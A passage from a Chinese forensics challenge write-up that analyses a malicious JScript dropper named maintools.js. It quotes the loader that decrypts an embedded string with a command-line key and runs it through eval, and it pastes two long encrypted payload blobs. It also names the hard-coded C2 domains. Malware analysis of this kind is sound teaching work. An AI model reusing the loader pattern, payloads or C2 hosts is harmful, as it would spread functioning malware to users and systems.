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&quot;;return qGxZ;
对于这个js文件

```javascript
try{
  var wvy1 = WScript.Arguments;
  var ssWZ = wvy1(0);
  var ES3c = y3zb();
  ES3c = LXv5(ES3c);
  ES3c = CpPT(ssWZ,ES3c);
  eval(ES3c);  
}
```

WScript.Arguments;是用来获取命令行中所有的传入的参数的，返回一个数组

于是wvy1(0)调用了第一个传入参数，这第一个传入参数就是EzZETcSXyKAdF_e5I2i1

然后CpPT猜测是用来解密的，后面就是运行后续恶意脚本eval(ES3c)了

于是现在可以推断出来，EzZETcSXyKAdF_e5I2i1其就是密钥

### 41 接上题，释放并删除的文件是什么?【答案格式： abc.py】
#### 答案
maintools.js

#### 过程
见上题

### 42 接上题，该文件用的是什么语言?【答案格式： JavaScript】
#### 答案
JScript

#### 过程
虽然这玩意长得很像js，用js编译器也确实跑的通，但是并不是js（而且答案格式都告诉你js了肯定不会让你填这个）

仔细审计代码会发现

WScript是WSH对象，不是浏览器环境

还有其中的循环

```javascript
for (var i = 0; i < 256; i++)
 
 {AWy7[i] = i;}
```

这玩意在原版js里面会触发ASI（自动分号插入），使得for变成空循环体

因此这玩意应该是微软整的JScript，一个js实现

### 43 接上题，分配给命令行参数的变量叫什么名字?【答案格式： abc3】
#### 答案
wvy1

#### 过程
见40题最后的说明

这个js文件里面的开头

```javascript
try{
  var wvy1 = WScript.Arguments;
  var ssWZ = wvy1(0);
  var ES3c = y3zb();
  ES3c = LXv5(ES3c);
  ES3c = CpPT(ssWZ,ES3c);
  eval(ES3c);  
}
```

var wvy1 = WScript.Arguments;  
后面那玩意是命令行参数

### 44 接上题，哪个函数返回下一阶段代码(即第一轮混淆代码)?【答案格式： abc3】
#### 答案
y3zb

#### 过程
```javascript
try{
  var wvy1 = WScript.Arguments;
  var ssWZ = wvy1(0);
  var ES3c = y3zb();
  ES3c = LXv5(ES3c);
  ES3c = CpPT(ssWZ,ES3c);
  eval(ES3c);  
}
```

还是它

对于3个函数意义不清楚可以返回去看40题中的js文件

y3zb返回了一长串字符串，然后后面的LXv5和CpPT用来解密

### 45 接上题，可以使用哪个Windows脚本主机程序在命令行模式下执行该脚本?【答案格式： wscript.exe】
#### 答案
cscript.exe

#### 过程
纯粹的知识点题目

wsh有俩执行器

一个是GUI模式（窗口模式），是wscript.exe

一个是命令行模式，是cscript.exe

这里问命令行模式是什么

### 46 接上题，请提取出所有硬编码的C2(Command &Control)服务器域名?【答案格式： www.baidu.com、ww.gogle.com,按照在代码中出现的顺序排序.】
#### 答案
www.saipadiesel124.com、www.folk-cantabria.com

#### 过程
maintools里面找不到任何网站

既然如此，先把maintools.js里面藏着的脚本解出来

对着那玩意照抄就行（不大敢跑原文件（）所以决定自己把里面东西提取出来）

cipher = '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